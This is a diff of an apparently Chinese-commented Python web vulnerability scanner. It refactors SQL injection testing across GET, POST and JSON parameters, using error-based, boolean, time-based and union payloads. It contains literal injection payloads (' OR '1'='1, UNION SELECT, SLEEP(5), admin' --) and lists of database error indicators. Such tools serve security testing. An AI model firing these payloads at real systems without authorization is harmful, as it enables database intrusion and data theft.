@@ -16,7 +16,7 @@ try:
     from modules.request_sender import RequestSender
     from modules.request_builder import RequestBuilder
     from modules.response_parse import ResponseParse
-    from utils import load_config,load_sqli_payload,load_xss_payload
+    from utils import load_config,load_sqli_config,load_xss_payload
 except ImportError as e:
     print(f"导入模块失败: {e}")
     sys.exit(1)
@@ -73,6 +73,9 @@ class sampilescanner:
             "<body onload=",
             "<iframe src="
         ]
+
+        #SQL注入配置
+        self.sql_config=load_sqli_config()
 
         # 结果存储
         self.results = {
@@ -158,212 +161,660 @@ class sampilescanner:
         self.results['responses'].append(result['response'])
         self._collect_statistics()
 
-    def check_sql_injection(self, url_input):
-        """
-        SQL注入扫描
-        支持单个URL字符串或URL列表
+    def get_payloads_by_type(self,test_type,db_type=None):
+        """根据测试类型获取payload"""
+        payloads=[]
+        config=self.sql_config
+        #print(config)
 
+        if test_type=="error":
+            if db_type and db_type in config.get("payloads",{}):
+                #获取指定数据库的错误型payload
+                for payload in config['payloads'][db_type].get('error_based',[]):
+                    payloads.append({"payload":payload,"database":db_type})
+            else:
+                #获取所有数据库的错误型payload
+                for db in ["mysql","mssql","postgresql","oracle"]:
+                    if db in config.get("payloads",{}):
+                        for payload in config['payloads'][db].get('error_based',[]):
+                            payloads.append({"payload":payload,"database":db})
+                #添加通用payload
+                for payload in config['payloads'].get('generic_error_based',[]):
+                    payloads.append({"payload":payload,"database":"generic"})
+
+        elif test_type=="boolean":
+            if db_type and db_type in config.get("payloads",{}):
+                #获取指定数据库的布尔型payload
+                for payload in config['payloads'][db_type].get('boolean_based',[]):
+                    payloads.append({"payload":payload,"database":db_type})
+            else:
+                #获取所有数据库的布尔型payload
+                for db in ["mysql","mssql","postgresql","oracle"]:
+                    if db in config.get("payloads",{}):
+                        for payload in config['payloads'][db].get('boolean_based',[]):
+                            payloads.append({"payload":payload,"database":db})
+                
+        elif test_type=="time":
+            if db_type and db_type in config.get("payloads",{}):
+                #获取指定数据库的时间型payload
+                for payload in config['payloads'][db_type].get('time_based',[]):
+                    payloads.append({"payload":payload,"database":db_type})
+            else:
+                #获取所有数据库的时间型payload
+                for db in ["mysql","mssql","postgresql","oracle"]:
+                    if db in config.get("payloads",{}):
+                        for payload in config['payloads'][db].get('time_based',[]):
+                            payloads.append({"payload":payload,"database":db})
+
+        elif test_type=="union":
+            payloads.append({"payload": "' UNION SELECT NULL --", "database": "generic"})
+            payloads.append({"payload": "' UNION SELECT NULL, NULL --", "database": "generic"})
+            payloads.append({"payload": "' UNION SELECT 1,2,3 --", "database": "generic"})
+            payloads.append({"payload": "' UNION SELECT 1,2,3,4 --", "database": "generic"})
+        
+        return payloads
+    
+    def detect_sql_vulnerability(self,response,test_type,payload,param_name,
+                                 original_value,url,method,db_type,response_time,**kwargs):
+        """检测各种类型的SQL注入漏洞"""
+        if not response or 'response' not in response:
+            return None
+        
+        response_text=response['response'].get('text','').lower()
+        status_code=response['response'].get('status_code',0)
+
+        #1.错误型注入检测
+        if test_type=="error":
+            for db,indicators in self.sql_config.get("error_indicators",{}).items():
+                for indicator in indicators:
+                    if indicator.lower() in response_text:
+                        return {
+                             "url": url,
+                            "type": f"SQL Injection (Error-Based - {db})",
+                            "payload": payload,
+                            "parameter": param_name,
+                            "original_value": original_value,
+                            "confidence": "高",
+                            "method": method,
+                            "database_type": db,
+                            "error_indicator": indicator,
+                            "response_code": status_code,
+                            "response_time": round(response_time, 2),
+                            "evidence": response_text[:500] if response_text else ""
+                        }
+
+        #2.布尔型注入检测
+        elif test_type=="boolean":
+            true_indicators=self.sql_config.get("boolean_indicators",{}).get("true_indicators",[])
+            false_indicators=self.sql_config.get("boolean_indicators",{}).get("false_indicators",[])
+
+            for indicator in true_indicators:
+                if indicator.lower() in response_text:
+                    return {
+                        "url": url,
+                        "type": f"SQL Injection (Boolean-Based)",
+                        "payload": payload,
+                        "parameter": param_name,
+                        "original_value": original_value,
+                        "confidence": "中",
+                        "method": method,
+                        "database_type": db_type,
+                        "response_code": status_code,
+                        "boolean_indicator": indicator,
+                        "response_time": round(response_time, 2)
+                    }
+        
+        #3.时间型注入检测
+        elif test_type=="time":
+            threshold=self.sql_config.get("time_based_threshold",3.0)
+            if response_time > threshold:
+                return {
+                    "url": url,
+                    "type": f"SQL Injection (Time-Based)",
+                    "payload": payload,
+                    "parameter": param_name,
+                    "original_value": original_value,
+                    "confidence": "中",
+                    "method": method,
+                    "database_type": db_type,
+                    "response_code": status_code,
+                    "response_time": round(response_time, 2),
+                    "delay_threshold": threshold,
+                    "actual_delay": round(response_time, 2)
+                }
+
+        #4.联合查询型注入检测
+        elif test_type=="union":
+            union_indicators=["null", "union", "select", "from", "where"]
+            indicator_count=sum(1 for ind in union_indicators if ind in response_text)
+
+            if indicator_count >= 3:
+                return {
+                    "url": url,
+                    "type": f"SQL Injection (Union-Based)",
+                    "payload": payload,
+                    "parameter": param_name,
+                    "original_value": original_value,
+                    "confidence": "高",
+                    "method": method,
+                    "database_type": db_type,
+                    "response_code": status_code,
+                    "union_indicators_found": indicator_count,
+                    "response_time": round(response_time, 2)
+                }
+        
+        return None
+    
+    def test_get_injection(self,base_url,params,test_types):
+        """测试GET请求注入"""
+        vulnerabilities=[]
+        for param_name, original_values in params.items():
+            if not original_values:
+                continue
+
+            original_value=original_values[0]
+            print(f"测试参数：{param_name}={original_value}")
+
+            for test_type in test_types:
+                payloads=self.get_payloads_by_type(test_type)
+                for payload_info in payloads:
+                    payload=payload_info.get("payload","")
+                    db_type=payload_info.get("database","generic")
+
+                    #构建测试参数
+                    test_params=params.copy()
+                    test_params[param_name]=[f"{original_value}{payload}"]
+                    
+                    #构建查询字符串
+                    guery_parts=[]
+                    for key,values in test_params.items():
+                        for value in values:
+                            guery_parts.append(f"{key}={value}")
+                    query_string="&".join(guery_parts)
+
+                    #构建测试URL
+                    test_url=f"{base_url}?{query_string}" if query_string else base_url
+                    print(f"    ↳ 类型: {test_type.upper()}, Payload: {payload[:30]}...")
+
+                    try:
+                        start_time=time.time()
+
+                        request_info={
+                            'method': 'GET',
+                             'url': test_url,
+                             'headers': self.sql_config.get("request_config",{}).get("headers",{}),
+                        }
+
+                        response=self.send_controlled_request(request_info)
+                        response_time=time.time()-start_time
+
+                        if response is None:
+                            continue
+
+                        #根据测试类型检测漏洞
+                        vuln= self.detect_sql_vulnerability(
+                            response,test_type,payload,param_name,
+                            original_value,test_url,"GET",db_type,response_time
+                        )
+
+                        if vuln:
+                            vulnerabilities.append(vuln)
+                            print(f"    ↳ 发现SQL注入漏洞！类型: {vuln['type']}")
+                    except Exception as e:
+                        print(f"    ↳ 请求失败: {e}")
+                        continue
+
+        return vulnerabilities
+
+    def test_post_injection(self,base_url,data,test_types):
+        """测试POST请求注入"""
+        vulnerabilities=[]
+        for param_name, original_value in data.items():
+            print(f"测试POST参数：{param_name}={original_value}")
+
+            for test_type in test_types:
+                payloads=self.get_payloads_by_type(test_type)
+
+                for payload_info in payloads:
+                    payload=payload_info.get("payload","")
+                    db_type=payload_info.get("database","generic")
+
+                    #构建测试参数
+                    test_data=data.copy()
+                    test_data[param_name]=f"{original_value}{payload}"
+
+                    try:
+                        start_time=time.time()
+
+                        request_info={
+                            'method': 'POST',
+                             'url': base_url,
+                             'headers': self.sql_config.get("request_config",{}).get("headers",{}),
+                             'data': test_data
+                        }
+
+                        response=self.send_controlled_request(request_info)
+                        response_time=time.time()-start_time
+
+                        if response is None:
+                            continue
+
+                        #根据测试类型检测漏洞
+                        vuln= self.detect_sql_vulnerability(
+                            response,test_type,payload,param_name,
+                            original_value,base_url,"POST",db_type,response_time,
+                            post_data=test_data
+                        )
+
+                        if vuln:
+                            vulnerabilities.append(vuln)
+                            print(f"    ↳ 发现SQL注入漏洞！类型: {vuln['type']}")
+                    except Exception as e:
+                        print(f"    ↳ 请求失败: {e}")
+                        continue
+
+        return vulnerabilities
+    
+    def test_json_injection(self,base_url,data,test_types):
+        """测试JSON格式POST注入"""
+        vulnerabilities=[]
+        for param_name, original_value in data.items():
+            print(f"测试JSON参数：{param_name}={original_value}")
+
+            for test_type in test_types:
+                payloads=self.get_payloads_by_type(test_type)
+
+                for payload_info in payloads:
+                    payload=payload_info.get("payload","")
+                    db_type=payload_info.get("database","generic")
+
+                    #构建JSON数据
+                    json_data=data.copy()
+                    json_data[param_name]=f"{original_value}{payload}"
+
+                    try:
+                        headers=self.sql_config.get("request_config",{}).get("headers",{}).copy()
+                        headers['Content-Type'] = 'application/json'
+                        
+                        start_time=time.time()
+
+                        request_info={
+                            'method': 'POST',
+                             'url': base_url,
+                             'headers': headers,
+                             'json': json_data
+                        }
+
+                        response=self.send_controlled_request(request_info)
+                        response_time=time.time()-start_time
+
+                        if response is None:
+                            continue
+
+                        #根据测试类型检测漏洞
+                        vuln= self.detect_sql_vulnerability(
+                            response,test_type,payload,param_name,
+                            original_value,base_url,"POST(JSON)",db_type,response_time,
+                            post_data=json_data
+                        )
+
+                        if vuln:
+                            vulnerabilities.append(vuln)
+                            print(f"    ↳ 发现SQL注入漏洞！类型: {vuln['type']}")
+                    except Exception as e:
+                        print(f"    ↳ 请求失败: {e}")
+                        continue
+
+        return vulnerabilities
+
+    def check_sql_injection(self,url_input,methods=["GET","POST"],test_types=None):
+        """
+        全面的SQL注入扫描
+        
         Args:
             url_input: 单个URL字符串 或 URL列表
-
+            methods: 要测试的HTTP方法列表 ["GET", "POST"]
+            test_types: 要测试的注入类型列表 ["error", "boolean", "time", "union"]
+        
         Returns:
-            list: 发现的漏洞列表
+            tuple: (漏洞列表, 扫描结果统计)
         """
-        # SQL注入测试载荷
-        testpayloads = [
-            "'",
-            "\"",
-            "' OR '1'='1",
-            "\" OR \"1\"=\"1",
-            "' OR '1'='1' --",
-            "' OR 1=1 --",
-            "' UNION SELECT NULL --",
-            "1' AND SLEEP(5) --",
-            "1' OR '1'='1",
-            "-1' UNION SELECT 1,2,3 --",
-            "admin' --",
-            "1' ORDER BY 1 --",
-            "1' AND 1=2 UNION SELECT 1,2,3 --"
-        ]
 
-        # SQL错误指示器（全部小写以便比较）
-        error_indicators = [
-            "you have an error in your sql syntax",
-            "warning: mysql",
-            "sql syntax",
-            "mysql_fetch",
-            "syntax error",
-            "mysql_num_rows",
-            "unclosed quotation mark",
-            "quoted string not properly terminated",
-            "mysql error",
-            "sql server",
-            "ora-",
-            "postgresql",
-            "sqlite",
-            "odbc",
-            "jdbc",
-            "pdo",
-            "sql command",
-            "division by zero",
-            "invalid query",
-            "unknown column",
-            "table doesn't exist"
-        ]
+        #设置默认测试类型
+        if test_types is None:
+            test_types=["error","boolean","time","union"]
 
-        vulnerabilities = []
+        vulnerabilities=[]
 
-        # 统一处理输入：将单个URL转换为列表
+        # 统一处理输入
         if isinstance(url_input, str):
             urls = [url_input]
         elif isinstance(url_input, list):
             urls = url_input
         else:
             raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")
+        
+        print(f"🔍 开始SQL注入扫描，目标数量: {len(urls)}")
+        print(f"测试方法: {methods}")
+        print(f"测试类型: {test_types}")
 
-        # 对每个URL进行测试
         for url in urls:
-            # 确保URL是字符串
             if not isinstance(url, str):
                 print(f"跳过非字符串URL: {url}")
                 continue
-            
-            print(f"\n开始测试URL: {url}")
+
+            print(f"\n{'='*60}")
+            print(f"目标URL: {url}")
 
             try:
-                # 解析URL
-                parsed_url = urlparse(url)
-                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
-
-                # 提取查询参数
-                query_params = parse_qs(parsed_url.query)
-
-                # 如果没有查询参数，使用默认参数'id'
-                if not query_params:
-                    print(f"URL中没有查询参数，使用默认参数'id'")
-                    param_to_test = {'id': ['1']}
-                    params_to_test = [('id', '1')]
-                else:
-                    param_to_test = query_params
-                    params_to_test = []
-                    for key, values in query_params.items():
-                        if values:
-                            params_to_test.append((key, values[0]))
-
-                print(f"  基础URL: {base_url}")
-                print(f"  发现参数: {list(param_to_test.keys())}")
-
-                # 对当前URL测试所有payload
-                for payload in testpayloads:
-                    try:
-                        # 为每个参数创建测试URL
-                        for param_name, original_value in params_to_test:
-                            # 复制原始参数
-                            test_params = param_to_test.copy()
-
-                            # 对当前测试参数添加payload
-                            if param_name in test_params:
-                                # 保留原始值，加上payload
-                                test_value = f"{original_value}{payload}"
-                                test_params[param_name] = [test_value]
-
-                            # 构建查询字符串
-                            query_string = ""
-                            for key, values in test_params.items():
-                                for value in values:
-                                    if query_string:
-                                        query_string += "&"
-                                    query_string += f"{key}={value}"
-
-                            # 构建完整测试URL
-                            test_url = f"{base_url}?{query_string}"
-
-                            print(f"  测试payload: {payload}")
-                            print(f"  测试参数: {param_name}")
-                            print(f"  请求URL: {test_url}")
-
-                            # 准备请求信息
-                            request_info = {
-                                'method': 'GET',
-                                'url': test_url,
-                                'headers': {},
-                                'params': {}  # 参数已经在URL中，不需要单独传
-                            }
-
-                            # 发送请求
-                            response = self.send_controlled_request(request_info)
-
-                            if response is None:
-                                if hasattr(self.logger, 'error'):
-                                    self.logger.error(f"请求失败，响应为None: {test_url}")
-                                else:
-                                    print(f"请求失败，响应为None: {test_url}")
-                                continue
-                            
-                            # 检查解析的内容是否存在
-                            if 'parsed' not in response:
-                                error_msg = f"响应中没有parsed字段: {test_url}"
-                                if hasattr(self.logger, 'error'):
-                                    self.logger.error(error_msg)
-                                else:
-                                    print(error_msg)
-                                continue
-                            
-                            # 获取响应体
-                            body = str(response['parsed']['parsed_content'])
-
-                            # 检查是否有SQL错误指示器
-                            found_error = False
-                            body_lower = body.lower()
-
-                            for error in error_indicators:
-                                if error in body_lower:
-                                    vulnerabilities.append({
-                                        "url": url,  # 原始URL
-                                        "type": "SQL Injection",
-                                        "payload": payload,
-                                        "parameter": param_name,
-                                        "original_value": original_value,
-                                        "confidence": "低",
-                                        "tested_url": test_url,
-                                        "error_indicator": error,
-                                        "response_code": response['response']['status_code'],
-                                        "method": "GET"
-                                    })
-                                    found_error = True
-                                    print(f"  发现SQL注入漏洞！参数: {param_name}, 错误指示: {error[:50]}...")
-                                    break
-                                
-                            if not found_error:
-                                # 也可以检查其他SQL注入特征
-                                # 1. 检查响应时间延迟（如果有时间戳可以计算）
-                                # 2. 检查布尔盲注的特征
-                                # 3. 检查联合查询的特征
-
-                                # 简单的布尔盲注检测：检查响应长度变化
-                                # 这里可以添加更复杂的逻辑
-
-                                # 暂时标记为未发现
-                                print(f"  未发现漏洞 (参数: {param_name})")
-
-                    except requests.exceptions.Timeout:
-                        print(f"  请求超时: {url}")
-                        continue
-                    except requests.exceptions.RequestException as e:
-                        print(f"  请求错误: {e}")
-                        continue
-                    except Exception as e:
-                        print(f"  其他错误: {e}")
-                        continue
+                parsed_url=urlparse(url)
+                base_url=f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+                #解析原始参数
+                query_params=parse_qs(parsed_url.query)
+                #为GET方法测试
+                if "GET" in methods:
+                    print(f"\n[GET方法测试]")
+                    if query_params:
+                        vulns=self.test_get_injection(base_url,query_params,test_types)
+                        vulnerabilities.extend(vulns)
+                    else:
+                        #测试默认参数
+                        default_params={"id":["1"],"page":["1"],"user":["test"]}
+                        vulns=self.test_get_injection(base_url,default_params,test_types)
+                        vulnerabilities.extend(vulns)
                     
+                #为POST方法测试
+                if "POST" in methods:
+                    print(f"\n[POST方法测试]")
+                    #尝试从GET参数构建POST数据
+                    post_data={}
+                    for key,values in query_params.items():
+                        if values:
+                            post_data[key]=values[0]
+
+                    if not post_data:
+                        post_data={"username":"admin","password":"password","id":"1"}
+
+                    vulns=self.test_post_injection(base_url,post_data,test_types)
+                    vulnerabilities.extend(vulns)
+
+                    #测试JSON格式POST
+                    if "json" in test_types:
+                        vulns=self.test_json_injection(base_url,post_data,test_types)
+                        vulnerabilities.extend(vulns)
+
+                #测试头部注入
+                if "headers" in test_types:
+                    print(f"\n[头部注入测试] - 未实现")
+
             except Exception as e:
-                print(f"解析URL时出错: {e}")
+                print(f"❌ 处理URL时出错 {url}: {e}")
                 continue
+
+        #更新统计信息
+        self.update_sql_statistics(vulnerabilities)
+
+        print(f"\n{'='*60}")
+        print(f"扫描完成！")
+        print(f"总测试目标: {len(urls)}")
+        print(f"发现漏洞: {len(vulnerabilities)}")
+
+        #输出漏洞信息
+        if vulnerabilities:
+            print(f"\n漏洞详情:")
+            for i,vuln in enumerate(vulnerabilities,1):
+                print(f"{i}. URL: {vuln['url']}")
+                print(f"   类型: {vuln['type']}")
+                print(f"   参数: {vuln.get('parameter', 'N/A')}")
+                print(f"   方法: {vuln['method']}")
+                print(f"   可信度: {vuln['confidence']}")
+                if 'error_indicator' in vuln:
+                    print(f"   错误指示: {vuln['error_indicator']}")
+                print()
+
+        #更新全局结果
+        self.results['vulnerabilities'].extend(vulnerabilities)
+
+        return vulnerabilities, self.results
+    
+    def update_sql_statistics(self, vulnerabilities):
+        """更新SQL注入统计信息"""
+        if not hasattr(self.results,'sql_statistics'):
+            self.results['sql_statistics'] = {
+                "total_tested": 0,
+                "vulnerable_urls": 0,
+                "by_type": {},
+                "by_database": {},
+                "by_method": {}
+            }
+
+        stats=self.results['sql_statistics']
+
+        #获取唯一的URL列表
+        unique_urls=set(vuln["url"] for vuln in vulnerabilities)
+        stats["total_tested"]=len(unique_urls)
+        stats["vulnerable_urls"]=len(unique_urls)
+
+        #按类型统计
+        for vuln in vulnerabilities:
+            vuln_type=vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
+            stats["by_type"][vuln_type]=stats["by_type"].get(vuln_type,0)+1
+
+            #按数据库类型统计
+            db_type=vuln.get("database_type","unknown")
+            stats["by_database"][db_type]=stats["by_database"].get(db_type,0)+1
+
+            #按请求方法统计
+            method=vuln.get("method","unknown")
+            stats["by_method"][method]=stats["by_method"].get(method,0)+1
             
-        # 统计结果
-        print(f"\n扫描完成！共发现 {len(vulnerabilities)} 个SQL注入漏洞")
-        scan_results=self.results
-        return vulnerabilities,scan_results
+
+    # def check_sql_injection(self, url_input):
+    #     """
+    #     SQL注入扫描
+    #     支持单个URL字符串或URL列表
+
+    #     Args:
+    #         url_input: 单个URL字符串 或 URL列表
+
+    #     Returns:
+    #         list: 发现的漏洞列表
+    #     """
+    #     # SQL注入测试载荷
+    #     testpayloads = [
+    #         "'",
+    #         "\"",
+    #         "' OR '1'='1",
+    #         "\" OR \"1\"=\"1",
+    #         "' OR '1'='1' --",
+    #         "' OR 1=1 --",
+    #         "' UNION SELECT NULL --",
+    #         "1' AND SLEEP(5) --",
+    #         "1' OR '1'='1",
+    #         "-1' UNION SELECT 1,2,3 --",
+    #         "admin' --",
+    #         "1' ORDER BY 1 --",
+    #         "1' AND 1=2 UNION SELECT 1,2,3 --"
+    #     ]
+
+    #     # SQL错误指示器（全部小写以便比较）
+    #     error_indicators = [
+    #         "you have an error in your sql syntax",
+    #         "warning: mysql",
+    #         "sql syntax",
+    #         "mysql_fetch",
+    #         "syntax error",
+    #         "mysql_num_rows",
+    #         "unclosed quotation mark",
+    #         "quoted string not properly terminated",
+    #         "mysql error",
+    #         "sql server",
+    #         "ora-",
+    #         "postgresql",
+    #         "sqlite",
+    #         "odbc",
+    #         "jdbc",
+    #         "pdo",
+    #         "sql command",
+    #         "division by zero",
+    #         "invalid query",
+    #         "unknown column",
+    #         "table doesn't exist"
+    #     ]
+
+    #     vulnerabilities = []
+
+    #     # 统一处理输入：将单个URL转换为列表
+    #     if isinstance(url_input, str):
+    #         urls = [url_input]
+    #     elif isinstance(url_input, list):
+    #         urls = url_input
+    #     else:
+    #         raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")
+
+    #     # 对每个URL进行测试
+    #     for url in urls:
+    #         # 确保URL是字符串
+    #         if not isinstance(url, str):
+    #             print(f"跳过非字符串URL: {url}")
+    #             continue
+            
+    #         print(f"\n开始测试URL: {url}")
+
+    #         try:
+    #             # 解析URL
+    #             parsed_url = urlparse(url)
+    #             base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+
+    #             # 提取查询参数
+    #             query_params = parse_qs(parsed_url.query)
+
+    #             # 如果没有查询参数，使用默认参数'id'
+    #             if not query_params:
+    #                 print(f"URL中没有查询参数，使用默认参数'id'")
+    #                 param_to_test = {'id': ['1']}
+    #                 params_to_test = [('id', '1')]
+    #             else:
+    #                 param_to_test = query_params
+    #                 params_to_test = []
+    #                 for key, values in query_params.items():
+    #                     if values:
+    #                         params_to_test.append((key, values[0]))
+
+    #             print(f"  基础URL: {base_url}")
+    #             print(f"  发现参数: {list(param_to_test.keys())}")
+
+    #             # 对当前URL测试所有payload
+    #             for payload in testpayloads:
+    #                 try:
+    #                     # 为每个参数创建测试URL
+    #                     for param_name, original_value in params_to_test:
+    #                         # 复制原始参数
+    #                         test_params = param_to_test.copy()
+
+    #                         # 对当前测试参数添加payload
+    #                         if param_name in test_params:
+    #                             # 保留原始值，加上payload
+    #                             test_value = f"{original_value}{payload}"
+    #                             test_params[param_name] = [test_value]
+
+    #                         # 构建查询字符串
+    #                         query_string = ""
+    #                         for key, values in test_params.items():
+    #                             for value in values:
+    #                                 if query_string:
+    #                                     query_string += "&"
+    #                                 query_string += f"{key}={value}"
+
+    #                         # 构建完整测试URL
+    #                         test_url = f"{base_url}?{query_string}"
+
+    #                         print(f"  测试payload: {payload}")
+    #                         print(f"  测试参数: {param_name}")
+    #                         print(f"  请求URL: {test_url}")
+
+    #                         # 准备请求信息
+    #                         request_info = {
+    #                             'method': 'GET',
+    #                             'url': test_url,
+    #                             'headers': {},
+    #                             'params': {}  # 参数已经在URL中，不需要单独传
+    #                         }
+
+    #                         # 发送请求
+    #                         response = self.send_controlled_request(request_info)
+
+    #                         if response is None:
+    #                             if hasattr(self.logger, 'error'):
+    #                                 self.logger.error(f"请求失败，响应为None: {test_url}")
+    #                             else:
+    #                                 print(f"请求失败，响应为None: {test_url}")
+    #                             continue
+                            
+    #                         # 检查解析的内容是否存在
+    #                         if 'parsed' not in response:
+    #                             error_msg = f"响应中没有parsed字段: {test_url}"
+    #                             if hasattr(self.logger, 'error'):
+    #                                 self.logger.error(error_msg)
+    #                             else:
+    #                                 print(error_msg)
+    #                             continue
+                            
+    #                         # 获取响应体
+    #                         body = str(response['parsed']['parsed_content'])
+
+    #                         # 检查是否有SQL错误指示器
+    #                         found_error = False
+    #                         body_lower = body.lower()
+
+    #                         for error in error_indicators:
+    #                             if error in body_lower:
+    #                                 vulnerabilities.append({
+    #                                     "url": url,  # 原始URL
+    #                                     "type": "SQL Injection",
+    #                                     "payload": payload,
+    #                                     "parameter": param_name,
+    #                                     "original_value": original_value,
+    #                                     "confidence": "低",
+    #                                     "tested_url": test_url,
+    #                                     "error_indicator": error,
+    #                                     "response_code": response['response']['status_code'],
+    #                                     "method": "GET"
+    #                                 })
+    #                                 found_error = True
+    #                                 print(f"  发现SQL注入漏洞！参数: {param_name}, 错误指示: {error[:50]}...")
+    #                                 break
+                                
+    #                         if not found_error:
+    #                             # 也可以检查其他SQL注入特征
+    #                             # 1. 检查响应时间延迟（如果有时间戳可以计算）
+    #                             # 2. 检查布尔盲注的特征
+    #                             # 3. 检查联合查询的特征
+
+    #                             # 简单的布尔盲注检测：检查响应长度变化
+    #                             # 这里可以添加更复杂的逻辑
+
+    #                             # 暂时标记为未发现
+    #                             print(f"  未发现漏洞 (参数: {param_name})")
+
+    #                 except requests.exceptions.Timeout:
+    #                     print(f"  请求超时: {url}")
+    #                     continue
+    #                 except requests.exceptions.RequestException as e:
+    #                     print(f"  请求错误: {e}")
+    #                     continue
+    #                 except Exception as e:
+    #                     print(f"  其他错误: {e}")
+    #                     continue
+                    
+    #         except Exception as e:
+    #             print(f"解析URL时出错: {e}")
+    #             continue
+            
+    #     # 统计结果
+    #     print(f"\n扫描完成！共发现 {len(vulnerabilities)} 个SQL注入漏洞")
+    #     scan_results=self.results
+    #     return vulnerabilities,scan_results
 
     # def check_sql_injection(self, url_input):
     #     """
